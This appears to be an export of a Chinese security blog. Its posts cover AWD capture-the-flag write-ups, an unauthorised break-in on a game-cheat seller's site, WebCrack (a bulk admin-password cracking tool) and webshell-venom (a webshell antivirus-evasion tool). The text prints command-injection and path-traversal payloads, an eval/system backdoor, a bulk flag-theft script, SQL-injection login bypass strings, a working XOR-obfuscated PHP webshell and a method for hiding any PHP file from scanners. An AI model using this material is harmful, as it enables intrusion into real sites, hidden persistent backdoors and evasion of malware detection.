if($type==&quot;image/jpeg&quot;)&#123; $name =$_FILES[&quot;file&quot;][&quot;name&quot;] ; if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) &#123; echo &quot;&lt;script&gt;alert(&apos;文件已经存在&apos;);&lt;/script&gt;&quot;; &#125; else &#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;assets/images/avatars/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]); $helper = new sqlhelper(); $sql = &quot;UPDATE admin SET icon=&apos;$name&apos; WHERE id=$_SESSION[id]&quot;; $helper-&gt;execute_dml($sql); &#125; &#125;else&#123; echo &quot;&lt;script&gt;alert(&apos;不允许上传的类型&apos;);&lt;/script&gt;&quot;; &#125; &#125;&#125;可以看到他对文件类型的判断仅仅是if($type==&quot;image/jpeg&quot;) 这里在数据包里修改content-type即可绕过，所上传的文件将会保存在assets/images/avatars/目录下。但是由于平台数据库有点问题，无法进行注入，所以这个洞当时也没利用起来。WEB2web2是web1的升级版，当时少看见一个文件读取的洞，亏死啦！预留后门pww.php跟pass.php都是冰蝎。。。不会写冰蝎的批量脚本，队伍又31个队，就基本没管这个后门index.php里面就是一个普通的一句话命令注入我们可以看到D盾还报了一个exec后门直接把$host双引号里带入然后看一下$host是怎么来的然后看数据是如何放入数据库的在收到$_POST['host']后程序还经过了一层addslashes操作，过滤其中的单双引号还有斜杠但是实际上在执行的$r = exec(&quot;ping -c 1 $host&quot;);这一句中并不需要引号逃逸，所以他的过滤操作并没有什么卵用。因为exec是没有回显的，所以构造以下payload1||cat /flag &gt; /ver/www/html/1.txt把flag输出到网站根目录下好像是需要登录，具体我也忘了任意文件读取img.php1234567&lt;?php$file = $_GET[&apos;img&apos;];$img = file_get_contents(&apos;images/icon/&apos;.$file);//使用图片头输出浏览器header(&quot;Content-Type: image/jpeg;text/html; charset=utf-8&quot;);echo $img;exit;payload:/img.php?img=../../../../../../../flag反序列化同web1，只不过不需要x参数了WEB3能利用起来的好像就这一个洞，当时也没来得及看命令执行export.php1234567&lt;?php if (isset($_POST[&apos;name&apos;]))&#123; $name = $_POST[&apos;name&apos;]; exec(&quot;tar -cf backup/$name images/*.jpg&quot;); echo &quot;&lt;div class=\&quot;alert alert-success\&quot; role=\&quot;alert\&quot;&gt; 导出成功,&lt;a href=&apos;backup/$name&apos;&gt;点击下载&lt;/a&gt;&lt;/div&gt;&quot;&#125;?&gt;老套路，同web2payload: || cat /flag &gt; /var/www/html/1.txt ||艰难的权限维持其实AWD比赛刚开始的时候，最重要的是维持权限而不是急着交flag。当我还在审第一个web的时候，看到预留后门就问队友要不要给他框架弹个shell结果他告诉我框架爆炸了。。。弹shell一直500。。。缓缓打出三个问号。。。喵喵喵？？？以前都是用团队的这个框架没问题，结果今天死活连不上。。。。GG，这tm咋整啊，31个队手工维权玩个毛啊所以就只能搞一些骚操作循环批量GET FLAG撸了一串脚本，来回跑，然后加上接口自动提交，没有框架只能这样了乌鸦坐飞机对，没错，我们就是乌鸦，坐了别的队的飞机。自己靶机的流量日志上发现了别的队伍的payload写了个脚本看了下，几乎所有的队伍都被种上了这个师傅的马不死马循环写入，被删后马上复活你的马看起来不错，下一秒就是我的了。白嫖了好几轮的flag然后闲的没事想着不如连上蚁剑看看吧，找找其他师傅的马批量导入一下看见其他队伍被种了马，满怀热泪的帮他们删了站。有一个队伍被命令注入打惨了，也帮他们删个站吧。当然还看到不少其他队伍的马甚至还有批量上waf的py脚本毕竟是其他队伍的内部脚本，象征性打个码流量日志里还发现一个狼人队伍的循环感染不死马会遍历目录把所有的php文件头部加上后门1&lt;?php if (md5($_REQUEST[&apos;pass&apos;])===&quot;8e68ca4946b8e146a408f727eaf9da7c&quot;)&#123;@eval($_REQUEST[&apos;code&apos;]);@system($_REQUEST[&apos;sys&apos;]);&#125; ?&gt;不过惊讶的是他的md5居然可以解开somd5牛逼！好马，下一秒就是我的了批量脚本走起123456789101112131415161718192021import requestsimport jsonurl=&quot;http://39.100.119.37:&#123;0&#125;&#123;1&#125;80/login/index.php?pass=Happy.Every.Day&amp;code=system(&apos;cat /flag&apos;);&quot;def submit(flag): hosturl=&quot;http://39.100.119.37:10000/commit/flag&quot; data=&#123;&apos;flag&apos;:flag,&quot;token&quot;:&quot;xxxxx&quot;&#125; data=json.dumps(data) r=requests.post(hosturl,data=data,headers=&#123;&quot;Cookie&quot;:&quot;PHPSESSID=xxxxx&quot;,&quot;Content-Type&quot;:&quot;application/json; charset=UTF-8&quot;&#125;) print(r.text)for j in range(1,4): for i in range(1,32): i=str(i).zfill(2) url1=url.format(j,i) print(url1) try: res=requests.get(url=url1) if &apos;flag&apos; in res.text: submit(res.text[0:38]) print(res.text[0:38]) except: pass尾声最后web基本上都修了，payload已经打不动了只能靠不死马来get flag因为开始手快，得分比较多，还有负责修的队友比较给力，掉分不是很多。然而毕竟是白嫖别人的马，所以增长分数的速度越来越慢最后还往后掉了一名，不过还拿个小奖hhhhh总结师傅们一个个都心狠手辣，但是说到最后还是自己有很多没有考虑到的地方。因为框架主要是需要先弹个shell到自己的服务器，然后才能自动维权，get flag等一系列操作但是开始框架崩了后直接懵了，不知道怎么办其实现在想自己完全可以当时重写一个批量种不死马的脚本来维权但是当时31个队伍，三个一堆洞的web，难免有些手忙脚乱。有些队伍的通防很厉害，匹配到关键字直接返回一个假的flag，自己准备也写一个。怀疑他们用的都是一家的脚本。。。。返回的flag都一样最后AWD一般都是线下赛，线上AWD见得还不多。星盟的这个线上赛体验还是很不错的，能够撑住31个队伍，每个队伍5个题也是挺厉害的中途虽然平台有宕机但是很快就恢复了。给星盟点个赞，希望星盟以后越做越好~]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[知识星球]WebShell免杀之ASP]]></title>
    <url>%2Fposts%2Fwebshell-bypass-asp%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[向吃鸡外挂站开炮（一）]]></title>
    <url>%2Fposts%2Fhack-pubg-cheat-site-1%2F</url>
    <content type="text"><![CDATA[前言因为最近吃鸡被外挂打自闭了，所以准备也让那些卖挂的体会一下什么叫做自闭。昨天晚上爬了快1000个卖吃鸡外挂的平台你们这些卖挂的，等我有空了一个一个捶。发现大多数都是用的一套aspx的程序，可惜没有源码不能白盒审计，黑盒也找不到什么洞只能找找软柿子捏昨天晚上一口气锤了四个基本上都有宝塔不过php-venom 4 系列加上配套的编码器过宝塔稳得一批脱了裤子发现里面4000+孤儿今天晚上又锤了一个吃鸡外挂站可惜尴尬的是没有写入权限写篇大水文记录一下正文毫无套路进后台这个应该算是那种推广站，里面什么都没有，只有宣传内容管你是什么，照锤不误。看了一下是织梦二次开发的站后台很容易进，这里大家都明白什么意思。玄学后台发现后台删了很多功能，特别是织梦的坑货文件管理器但是从经验上来说很多这种二次开发的并不是真的把编辑器删掉了，只是在后台页面不显示了。审查元素启动随便找个链接改一下，替换成media_main.php?dopost=filemanager然后点击，果然找到了文件管理器页面上传shell本来以为就这样结束了结果发现虽然提示上传成功但是啥都没有还以为是waf，就换了人畜无害的一张jpg上去也是啥都没有以为是目录权限问题找到session的临时文件，上传，照样不行图就不放了，总之就是传不上去觉得可能是整站没写权限随手试试删除功能，发现可以删文件emmmmm，所以到底是有权限没有呢一般来说没写权限的话也就没有修改权限，也就是没有删除权限想着是不是上传功能坏了，换个方法getshell吧全员gg首先想到的就是改文件，里面放个shell显示csrf token不对搜了搜怎么解决发现是直接改check函数，第一句加上return结果修改config.php 文件也弹这个错误所以就陷入死循环。。。改标签也是一样的错误。然后试了织梦的各个0day，后台代码任意执行提示执行成功了，但是要么404页面，要么就是csrf token报错为啥老是csrf token检测失败，以前就没遇到过这种问题。是我操作不对吗？如果有表哥知道为什么的话麻烦告诉我一下谢谢柳暗花明本来想想算了，然后出去吃了个饭。然后想着既然是弱口令会不会有其他人的后门呢。就想起来织梦有个自带的后门查杀功能同样的审查元素，找到后门查杀功能，开始扫描果然发现可疑文件然后一看全是其他人的后门随便找一个，连接上去getshell最后发现是星外，并且全站没有写入权限，难怪传不上去。。。翻了翻目录，不能跨站，没写权限，无法bypass disable function等于是啥都没有。。。但是神奇的是可以任意文件删除站就不删了，保存一下证据，提交网警。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebCrack：网站后台弱口令批量检测工具]]></title>
    <url>%2Fposts%2Fwebcrack-release%2F</url>
    <content type="text"><![CDATA[> 经过这么长时间的测试终于算是可以上线了，写篇文章跟大家分享一下自己的开发思路吧 >注：本工具借鉴吸收了TideSec的[web_pwd_common_crack](https://github.com/TideSec/web_pwd_common_crack)很多优秀的思路，在此基础上增加了很多拓展功能使其更加强大，在这里给TideSec的大佬点个赞！前言在做安全测试的时候，随着资产的增多，经常会遇到需要快速检测大量网站后台弱口令的问题。然而市面上并没有一个比较好的解决方案，能够支持对各种网站后台的通用检测。所以WebCrack就应运而生。工具简介WebCrack是一款web后台弱口令/万能密码批量爆破、检测工具。不仅支持如discuz，织梦，phpmyadmin等主流CMS并且对于绝大多数小众CMS甚至个人开发网站后台都有效果在工具中导入后台地址即可进行自动化检测。实现思路大家想一下自己平常是怎么用burpsuite的intruder模块来爆破指定目标后台的1抓包 -&gt; send to intruder -&gt; 标注出要爆破的参数 -&gt; 发送payload爆破 -&gt; 查看返回结果找出返回包长度大小不同的那一个，基本上就是所需要的答案。那么WebCrack就是模拟这个过程但是就要解决两个问题如何自动识别出要爆破的参数如何自动判断是否登录成功识别爆破参数对于这个问题采用了web_pwd_common_crack的解决办法就是根据提取表单中 user pass 等关键字，来判断用户名跟密码参数的位置123456789101112131415if parameter: if not user_key: for z in [ &apos;user&apos;, &apos;name&apos;,&apos;zhanghao&apos;, &apos;yonghu&apos;, &apos;email&apos;, &apos;account&apos;]: if z in parameter.lower(): value = &apos;&#123;user_name&#125;&apos; user_key = parameter ok_flag = 1 break if not ok_flag: for y in [&apos;pass&apos;, &apos;pw&apos;, &apos;mima&apos;]: if y in parameter.lower(): value = &apos;&#123;pass_word&#125;&apos; pass_key = parameter ok_flag = 1 break但是在测试中还发现，有些前端程序员用拼音甚至拼音缩写来给变量命名什么yonghu , zhanghao , yhm(用户名), mima 等虽然看起来很捉急，但是也只能把它们全部加进关键字判断名单里。如何判断登录成功这个可以说是最头疼的问题如果对于一种管理系统还好说，只要找到规律，判断是否存在登录成功的特征就可以但是作为通用爆破脚本来说，世界上的网站各种各样，不可能去一个个找特征，也不可能一个个去正则匹配。经过借鉴web_pwd_common_crack的思路，与大量测试总结出来了以下一套比较有效的判断方式。判断是否动态返回值并获取Error Length先发送两次肯定错误的密码如length_test获取两次返回值并比较如果两次的值不同，则说明此管理系统面对相同的数据包返回却返回不同的长度，此时脚本无法判断，退出爆破。如果相同，则记录下此值，作为判断的基准。然而实际中会先请求一次，因为发现有些管理系统在第一次登录时会在响应头部增加标记。如果去掉此项可能会导致判断失误。判断用户名跟密码的键名是否存在在跳转后的页面中这个不用过多解释，如果存在的话说明没登录成功又退回到登录页面了。有人会问为什么不直接判断两个页面是否相等呢因为测试中发现有些CMS会给你在登录页面弹个登录失败的框，所以直接判断是否相等并不准确。还有一种计算页面哈希的办法，然后判断两者的相似程度。但是觉得并没有那个必要，因为有不同的系统难以用统一的阈值来判断，故舍弃。关键字黑名单检测黑名单关键字列表123[&apos;密码错误&apos;, &apos;重试&apos;, &apos;不正确&apos;, &apos;密码有误&apos;,&apos;不成功&apos;, &apos;重新输入&apos;, &apos;history.back&apos;, &apos;不存在&apos;, &apos;登录失败&apos;,&apos;登陆失败&apos;,&apos;出错&apos;,&apos;已被锁定&apos;,&apos;history.go&apos;,&apos;安全拦截&apos;,&apos;还可以尝试&apos;,&apos;无效&apos;,&apos;攻击行为&apos;,&apos;创宇盾&apos;, &apos;非法&apos;,&apos;百度加速&apos;,&apos;安全威胁&apos;,&apos;防火墙&apos;,&apos;黑客&apos;, &apos;不合法&apos;,&apos;warning.asp?msg=&apos;,&apos;Denied&apos;]本来还设置了白名单检测机制就是如果有“登录成功”的字样出现肯定就是爆破成功但是后来发现并没有黑名单来的必要。因为首先不可能把所有CMS的登录成功的正则样本都放进去其次在测试的过程中，发现在其他检测机制的加持后，白名单的判断变得尤其鸡肋，故舍弃。黑名单就相比而言好的多如果弹出来&quot;密码错误&quot;，就不用再往下判断了然而实际测试中发现有些用js来判断登录的情况的时候，会同时出现“登录成功“，跟“登录失败”的字眼此时就只能通过其他方式判断了。Recheck环节为了提高准确度，防止误报。借鉴了web_pwd_common_crack的思路增加recheck环节。就是再次把crack出的账号密码给发包一次，并且与重新发送的error_length作比对如果不同则为正确密码。在这里没有沿用上一个error_length，是因为在实际测试中发现由于waf或者其他因素会导致返回包长度值变化。框架拓展用上面几种办法组合起来已经可以做到基本的判断算法了但是为了使WebCrack更加强大，我又添加了以下三个模块动态字典实现代码1234567891011121314151617181920212223242526272829303132def gen_dynam_dic(url): dynam_pass_dic = [] tmp_dic = [] suffix_dic = [&apos;&apos;, &apos;123&apos;, &apos;888&apos;, &apos;666&apos;, &apos;123456&apos;] list1 = url.split(&apos;/&apos;) host = list1[2].split(&quot;:&quot;)[0] compile_ip = re.compile(&apos;^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$&apos;) if compile_ip.match(host): check_ip = 1 else: check_ip = 0 if not check_ip: list2 = host.split(&quot;.&quot;) i = len(list2) for u in range(i): list3 = list2[u:] part = &apos;.&apos;.join(list3) if (len(part) &lt; 5): continue dynam_pass_dic.append(part) for u in range(i): list3 = list2[u] if len(list3) &lt; 5: continue tmp_dic.append(list3) for i in tmp_dic: for suffix in suffix_dic: u = i + suffix dynam_pass_dic.append(u) return dynam_pass_dic else: return &apos;&apos;假如域名是1webcrack.yzddmr6.com那么就会生成以下动态字典列表123456789101112webcrack.yzddmr6.comyzddmr6.comwebcrackwebcrack123webcrack888webcrack666webcrack123456yzddmr6yzddmr6123yzddmr6888yzddmr6666yzddmr6123456假如正则匹配到传来的是一个IP而不是域名的话就会返回一个空列表。万能密码检测后台的漏洞除了弱口令还有一大部分是出在万能密码上在WebCrack中也添加了一些常用的payload12345admin&apos; or &apos;a&apos;=&apos;a&apos;or&apos;=&apos;or&apos;admin&apos; or &apos;1&apos;=&apos;1&apos; or 1=1&apos;)or(&apos;a&apos;=&apos;a&apos;or 1=1--但是同时带来个问题会被各大WAF拦截这时候就可以把WAF拦截的关键字写到检测黑名单里，从而大大减少误报。小插曲用webcrack检测目标资产进入到了recheck环节但是webcrack却提示爆破失败。手工测试了一下检测出的万能密码发现出现了sql错误信息意识到可能存在后台post注入发现了sa注入点这也反应了对于后台sql注入，webcrack的正则匹配还做的不够完善，下一个版本改一下。自定义爆破规则有了上面这些机制已经可以爆破大部分网站后台了然而还是有一些特(sha)殊(diao)网站，并不符合上面的一套检测算法于是webcrack就可以让大家自定义爆破规则。自定义规则的配置文件放在同目录cms.json文件里参数说明123456789101112[ &#123; &quot;name&quot;:&quot;这里是cms名称&quot;, &quot;keywords&quot;:&quot;这里是cms后台页面的关键字,是识别cms的关键&quot;, &quot;captcha&quot;:&quot;1为后台有验证码，0为没有。因为此版本并没有处理验证码，所以为1则退出爆破&quot;, &quot;exp_able&quot;:&quot;是否启用万能密码模块爆破&quot;, &quot;success_flag&quot;:&quot;登录成功后的页面的关键字&quot;, &quot;fail_flag&quot;:&quot;请谨慎填写此项。如果填写此项，遇到里面的关键字就会退出爆破，用于dz等对爆破次数有限制的cms&quot;, &quot;alert&quot;:&quot;若为1则会打印下面note的内容&quot;, &quot;note&quot;:&quot;请保证本文件是UTF-8格式，并且请勿删除此说明&quot; &#125;]举个例子12345678910&#123; &quot;name&quot;:&quot;discuz&quot;, &quot;keywords&quot;:&quot;admin_questionid&quot;, &quot;captcha&quot;:0, &quot;exp_able&quot;:0, &quot;success_flag&quot;:&quot;admin.php?action=logout&quot;, &quot;fail_flag&quot;:&quot;密码错误次数过多&quot;, &quot;alert&quot;:0, &quot;note&quot;:&quot;discuz论坛测试&quot; &#125;其实对于dz,dedecms,phpmyadmin等框架本身的逻辑已经可以处理添加配置文件只是因为程序默认会开启万能密码爆破模块然而万能密码检测会引起大多数WAF封你的IP对于dz，dedecms这种不存在万能密码的管理系统如果开启的话不仅会影响效率，并且会被封IP所以配置文件里提供了各种自定义参数，方便用户自己设置。关于验证码验证码识别算是个大难题吧自己也写过一个带有验证码的demo，但是效果并不理想简单的验证码虽然能够识别一些，但是遇到复杂的验证码就效率极低，拖慢爆破速度并且你识别出来也不一定就有弱口令。。。所以就去掉了这个功能如果有大佬对这方面有好的想法，欢迎在github上留言或者邮箱 yzddmr6*@*gmail 联系我。总流程图一套流程下来大概是长这个亚子对比测试找了一批样本测试，跟tidesec的版本比较了一下web_pwd_common_crack 跑出来11个其中7个可以登录。4个是逻辑上的误报，跟waf拦截后的误报。webcrack 跑出来19个其中16个可以登录。2个是ecshop的误报，1个是小众cms逻辑的误报。webcrack比web_pwd_common_crack多探测出来的9个中有5个是万能密码漏洞，2个是发现的web_pwd_common_crack的漏报，2个是动态字典探测出来的弱口令。最后这个项目断断续续写了半年吧主要是世界上奇奇怪怪的网站太多了，后台登录的样式五花八门。有些是登录后给你重定向302到后台有些是给你重定向到登录失败页面有些是给你返回个登录成功，然后你要手动去点跳转后台有些直接返回空数据包。。。更神奇的是ecshop(不知道是不是所有版本都是这样)假如说密码是yzddmr6但是你输入admin888 与其他错误密码后的返回页面居然不一样。。。因为加入了万能密码模块后经常有WAF拦截，需要测试各个WAF对各个系统的拦截特征以及关键字。总的半年下来抓包抓了上万个都有了。。。。。。因为通用型爆破，可能无法做到百分百准确，可以自己修改配置文件来让webcrack更符合你的需求。项目地址https://github.com/yzddmr6/WebCrack]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>webcrack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webshell-venom 3.3 :利用随机异或免杀任意php文件]]></title>
    <url>%2Fposts%2Fwebshell-venom-3-3%2F</url>
    <content type="text"><![CDATA[前言没想到这么快就800颗星了这次算是一次比较重大的更新，具体情况请看下文。webshell-venom 3.3 更新日志代码结构优化，更清爽，方便自定义开发。减小shell体积。增加利用随机异或免杀任意php文件功能。1. 结构优化先上图吧原来因为随手写的脚本，代码其实比较乱这次整个重构了一遍，把随机的变量名随机字符串给标注了出来shell结构一目了然，方便大家自己二次开发。当然结构写的清爽也带来一些问题比如说厂商写查杀正则的时候更方便了。。。不过就像我一直强调的重要的从来不是脚本，而是思路只靠我一个人更新肯定是不行的我在脚本里提供了很多公共函数，自己稍微修改一下就可以bypass。2. 减小体积这个自己生成一下就能看得到，不讲了。12345678910&lt;?phpclass QCON&#123; function __destruct()&#123; $ARIK=&apos;cnP*lm&apos;^&quot;\x2\x1d\x23\x4f\x1e\x19&quot;; return @$ARIK(&quot;$this-&gt;DGBO&quot;); &#125;&#125;$qcon=new QCON();@$qcon-&gt;DGBO=isset($_GET[&apos;id&apos;])?base64_decode($_POST[&apos;mr6&apos;]):$_POST[&apos;mr6&apos;];?&gt;3.对任意php文件免杀这个是本文的重点，也是这次更新的重要部分，着重讲一下吧。首先区分免杀跟加密的区别加密就是让别人看不到源码免杀是绕过waf的检测，使其无法识别为木马单纯加密不一定可以免杀，但是免杀少不了加密单纯加密的话百度搜一下php在线加密，一大堆网站但是用过的都知道加密之后虽然谁都不认得了，但是D盾会报二级加密脚本二级肯定不是咱们的目的，所以就要做0级的免杀。任意文件免杀原理首先大家要知道一点:随便一个被D盾杀的妈都不认的shell，base64或者hex等编码后waf都不认得所以思路就是：先把原来的payload，给处理一遍然后通过函数调用来解密并执行payload如何调用处理的话脚本中就是用的base64那么如何调用呢其实如果用eval的话很好写，随便改一下就免杀了但是eval是一种语言结构不是函数，也就是不能像assert一样拆分就很难受自己有点强迫症，shell中不能出现eval等关键字，不然会被最简单的字符串搜索查找到shell所以就想到了assert但是问题来了，assert不能执行多句也就是说1assert(echo 1; echo 2; ); //差不多这个意思。。。最后只回显一个1，也就是只执行第一句话。但是所要免杀的php文件肯定不止一句话所以一般assert就要配合eval使用也就是assert(eval(xxx;xxx;xxx;));这种还是有eval，那我还用个鸡儿的assert。。。解决办法研究了一下，发现利用array_map+assert+eval加个数组处理就可以把eval给拆分掉了1array_map(&apos;u?ldOQ&apos;^&quot;\x14\x4c\x1f\x1\x3d\x25&quot;,array((&apos;P/f&#125;&apos;^&quot;\x35\x59\x7\x11&quot;).&quot;(base64_decode(&apos;xxxxxxxx&apos;));&quot;));上面的两个异或的字符串分别是assert跟eval哈，然后放在类里调用一下就免杀了。使用方法12python3 php-venom-3.3.py #生成免杀一句话python3 php-venom-3.3.py shell.php # 对同目录下shell.php进行免杀处理，保存在shell.php.bypass.php免杀冰蝎举个栗子，就免杀冰蝎吧。更多玩法还可以免杀我上次发的自己二次开发的大马大马地址：https://github.com/yzddmr6/BestShell200kb好像有点大。。。想减小体积的话自己加个gzin压缩吧免杀后的demo已经放到大马项目里了不足之处python的base64函数有点傻逼，不会自己检测源文件的编码方式php是世界上最好的语言我在脚本里用了 chardet 模块来探测可能的编码但是用了一下发现不能做到百分百正确识别utf8的没问题，遇到其他编码就容易乱码如果gbk乱码的话就自己手工base64一遍替换payload吧项目地址https://github.com/yzddmr6/webshell-venom]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>webshell-venom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebCrack:一键自动化日站工具]]></title>
    <url>%2Fposts%2Fwebcrack-1%2F</url>
    <content type="text"><![CDATA[前言当初日学校内网的时候有很多后台，就想着能不能批量检测一下弱口令但是学校的后台系统种类很多，asp aspx php jsp 等等因为单个网站的爆破比较好整，直接上burp或者py脚本或者hydra好像还没有听说过批量工具想着找一找有没有现成的工具能测一测。还真发现github上有一个https://github.com/TideSec/web_pwd_common_crack好像很厉害的样子下载下来试了一下，然而结果并不如人意误报率有百分之六十吧，可以说是非常不理想。其实目前市面上各种爆破工具并不少但是要么只能爆破某个指定的管理系统,要么就是不支持批量所以自己就想着写一个万能网站批量爆破的脚本，并且在一周内进行了简单的实现。现在博客建立起来了，想着是时候来记录一下。工具简介webcrack是一款web后台弱口令批量爆破、检测工具。支持当前各大主流cms管理系统，如dz论坛,织梦,ecshop等。在url.txt中放入后台地址即可进行自动化检测。思路及过程思路其实挺简单1提取表单 -&gt; 放入数据 -&gt; 发送数据 -&gt; 判断返回内容但是实现起来的难点主要有两个1.如何从表单各种奇奇怪怪的参数跟token中准确提取用户名和密码这一栏2.如何判断是否登录成功在测试过程中发现原来世界上有那么多叼毛网站。。。写的非常不规范。。。想要兼容所有的情况实在很难。只能采取多种判断策略以及一些折中的办法尽可能考虑所有可能出现的情况。问题一：如何准确提取账号密码问题1的解决是靠大量测试后总结出来的关键字从id或者class中提取键名与字典相对比,如果存在关键字即为要爆破的用户名或密码问题二：如何判断是否登录成功主要精力都放在解决这个问题上，因为不同后台的登录的情况实在是五花八门。举个例子，有些是登录后给你重定向302到后台有些是给你重定向到登录失败页面有些是给你返回个登录成功，然后你要手动去点跳转后台有些直接返回空数据包。。。本菜鸡也不会什么机器学习什么深度学习模型。。。想要通过一个办法是不可能一劳永逸的解决这个问题的。经过大量的测试，最后使用以下三个办法大大减少了误报率1. 判断用户名跟密码的键名是否存在在跳转后的页面中2. error_length 动态检测3. 关键字黑名单检测这三个办法是我经过无数次测试才总结出来的经验。。。经过测试，准确率已经达到了百分之八十。更新日志1.0版本写出demo减小误报率增加随机UA头 随机X-Forwarded-For和 随机Client-IP1.5 版本可以通过域名生成动态字典可以探测系统是否存在因为设计缺陷而造成的万能密码漏洞代码结构优化，提高性能2.0 版本启动多进程，放弃辣鸡多线程增加special_case，可以识别部分cms，并针对结果采用指定的识别方式修复reset按钮带来的bugTO DO增加简单的验证码识别模块考虑采用协程的方式优化性能完善special_case工具截图截几张图证明一下我不是在瞎BB最后这个项目真的是倾注了我很多的心血。文章中写的简单，然而实际在测试脚本中由于世界上的各种傻屌网站实在是太多了。。。各种小问题小bug。。。每个版本自己都会手工调试成百上千次，直到达到稳定。因为担心公开后网上的hc大佬跟脚本小子用脚本瞎鸡儿乱跑所以暂时不准备向任何人公开源代码。]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>webcrack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次AWD反杀之旅]]></title>
    <url>%2Fposts%2Fone-online-awd%2F</url>
    <content type="text"><![CDATA[背景星盟团队的内部awd训练，邀请我们团队参加，然后想着也没什么事情就报名了。为什么说叫反杀之旅？因为最开始的时候由于技术师傅的手误，前两轮设置后台check扣分的时候多按了一个0，导致一次check扣了我们1000分。。。本来每个队初始分数是1000，结果我们一下变成了0，成了倒数第一。不过经过团队的紧张的补救以及多年的手速，在多扣了几百分的情况下最后追赶到了正数第二名的位置。觉得还挺有意思，所以今天写篇博客来记录下过程。比赛规则比赛时间八月十四日（今晚）晚六点四十到十点四十比赛规则（队长比赛前五分钟找我私聊拿各自的登陆密码并尽快修改）1.每个队伍分配到一个docker主机，给定ctf用户权限，通过制定的端口和密码进行连接；2.每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍；3.选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到平台上。每次成功攻击可获得5分，被攻击者扣除5分；有效攻击五分钟一轮；4.选手需要保证己方服务的可用性，每次服务不可用，扣除100分；服务检测五分钟一轮；5.不允许使用任何形式的DOS攻击因为是awd一般是线下赛，线上的awd确实还是第一次搞。最开始的时候以为是在他搭建的内网里，还要端口转发到本地才能打，感觉麻烦很多。后来才发现不是，就是一个外网主机开了很多docker，不同docker在不同的端口，打的时候IP都不用换，直接找端口就可以了。看了下界面还是挺炫酷的哈哈哈冷静分析拿到ssh后先登上去，改密码，保存源码，D盾扫一扫虽然我经常发帖子过D盾，但是D盾确实很厉害啊哈哈哈，在比赛中还是非常有用的老套路，被留了各种后门。因为本来预定的环境有问题，启用了备用线路，所以只有一个web一个pwn，那就慢慢看吧。第一个后门 任意命令执行文件名 api.inc.php很多文件都包含有这个文件authcheckæ¯ä¸ªarray_mapï¼ä¸é¢51è¡åè°ç¨äºè¿ä¸ªauthcheck，代码意思就是说收到数组authååbase64è§£ç ä¸éï¼ç¶åç¨authcode参数来任意命令执行那么我们就可以构造以下payload：1http://xxxxx/api.inc.php?authcode=assert&amp;auth=ZXZhbCgkX1BPU1RbJ2EnXSk7auth参数解码后是1eval($_POST[&apos;a&apos;]);就可以生成个用蚁剑连接的一句话啦附一张当时的截图最开始因为手速快，所有的人都被我们拿了flag第二个后门 一句话木马这个没什么说的后来发现他的$islogin可以随便绕过。。根本不用登陆。。第三个后门 LFI直接包含flag就可以读取第四个后门 任意文件上传主要代码1234567891011121314151617if ($mod == &quot;release&quot;)&#123;echo&apos;&lt;div class=&quot;panel panel-primary&quot;&gt;&lt;div class=&quot;panel-heading&quot;&gt;&lt;h3 class=&quot;panel-title&quot;&gt;&apos;.$xiaofu.&apos; - 上传安装包&lt;/h3&gt;&lt;/div&gt;&lt;div class=&quot;panel-body&quot;&gt;&apos;;if ($_POST[&quot;s&quot;] == 1) &#123;$extension = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);if (($length = count($extension)) &gt; 1) &#123;$ext = strtolower($extension[$length-1]);&#125;if ($ext == &quot;png&quot; || $ext == &quot;gif&quot; || $ext == &quot;jpg&quot; || $ext == &quot;jpeg&quot; || $ext == &quot;bmp&quot;) &#123;$ext = &quot;png&quot;;&#125;copy($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],ROOT. &quot;download/release/release.&quot;.$ext);$city=get_ip_city($clientip);$czip=($udata[&apos;dlip&apos;]);$user=($udata[&apos;user&apos;]);$DB-&gt;query(&quot;insert into `auth_log` (`user`,`type`,`date`,`city`,`czip`,`data`) values (&apos;&quot;.$user.&quot;&apos;,&apos;上传安装&apos;,&apos;&quot;.$date.&quot;&apos;,&apos;&quot;.$city.&quot;&apos;,&apos;&quot;.$czip.&quot;&apos;,&apos;无&apos;)&quot;);echo &quot;成功上传文件!&lt;br&gt;（请刷新安装包文件夹）&quot;;&#125;&#125;意思就是说，收到上传文件后检查后缀，然后保存。但是仔细看这一句12if ($ext == &quot;png&quot; || $ext == &quot;gif&quot; || $ext == &quot;jpg&quot; || $ext == &quot;jpeg&quot; || $ext == &quot;bmp&quot;) &#123;$ext = &quot;png&quot;;&#125;如果后缀是这么多的一种，那么变量$ext 